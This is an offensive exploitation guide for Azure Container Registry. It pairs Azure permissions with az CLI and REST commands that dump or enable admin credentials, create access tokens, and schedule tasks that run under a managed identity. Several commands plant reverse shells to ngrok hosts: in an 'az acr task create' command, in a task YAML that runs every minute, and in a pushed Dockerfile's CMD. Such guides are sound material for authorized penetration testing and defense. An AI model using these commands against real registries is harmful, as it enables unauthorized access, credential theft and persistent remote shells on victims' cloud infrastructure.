---
title: "Azure Container Registry Explotation"
order: 102
description: Explotation of Azure Container Registry
---

## Pull image

```bash
docker pull $ACR_NAME.azurecr.io/$REGISTRY_NAME:$TAG
```

```bash
docker run --rm -it $ACR_NAME.azurecr.io/$REGISTRY_NAME:$TAG /bin/sh
```

## List admin credentials

> The permission needed is:
> - **Microsoft.ContainerRegistry/registries/listCredentials/action**
>
> This permission allows the user to list the admin credentials of the ACR. This is useful to get full access over the registry

```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ContainerRegistry/registries/<registry-name>/listCredentials?api-version=2023-11-01-preview"
```

> In case the admin credentials aren’t enabled, you will also need to enable them the permission 
> - **Microsoft.ContainerRegistry/registries/write**

```bash
az acr update -n $ACR_NAME --admin-enable
````

or

```bash
az rest --method PATCH --uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.ContainerRegistry/registries/<registry-name>?api-version=2023-11-01-preview" --body '{"properties": {"adminUserEnabled": true}}'
```

## Create/Update task inside a container

> The permission neeeded is:
> - **Microsoft.ContainerRegistry/registries/tasks/write**
>
> This is the main permission that allows to create and update a task in the registry. This can be used to execute a code inside a container with a managed identity attached to it in the container.

```bash
az acr task create \
    --registry $ACR_NAME \
    --name reverse-shell-task-cmd \
    --image rev/shell2:v1 \
    --cmd 'bash -c "bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1"' \
    --schedule "*/1 * * * *" \
    --context /dev/null \
    --commit-trigger-enabled false \
    --assign-identity
```

or using a file

```yaml
version: v1.1.0
steps:
  - cmd: bash -c "bash -i >& /dev/tcp/x.tcp.eu.ngrok.io/PORT 0>&1"
    disableWorkingDirectoryOverride: true
    timeout: 3600
```

```bash
az acr task create \
  --registry $ACR_NAME \
  --name $ACR_NAME \
  --file task.yaml \
  --schedule "*/1 * * * *" \
  --context /dev/null \
  --commit-trigger-enabled false \
  --assign-identity
```

### Run a scheduled task

> The permission required is:
> - **Microsoft.ContainerRegistry/registries/scheduleRun/action**
>
> These permissions allow the user to build and run a scheduled task

```bash
az acr task run \
  --registry $ACR_NAME \
  --name $ACR_NAME
```

## Create a token to access the registry

> The permissions required are:
> - **Microsoft.ContainerRegistry/registries/tokens/write**
> - **Microsoft.ContainerRegistry/registries/generateCredentials/action**
> - **Microsoft.ContainerRegistry/registries/generateCredentials/action**
>
> These permissions allow the user to create a new token with passwords to access the registry.

```bash
az acr token create \
  --registry $ACR_NAME \
  --name token \
  --scope-map _repositories_admin
```

## Push image

> The permission needed is:
> - **Microsoft.ContainerRegistry/registries/push/write**
>
> An attacker could load a image

```dockerfile
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl jq netcat-traditional
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/13106 0>&1"]
```

```bash
docker buildx build --platform linux/amd64 \
  -t $ACR_NAME.azurecr.io/$REGISTRY_NAME:$TAG \
  --push .
```
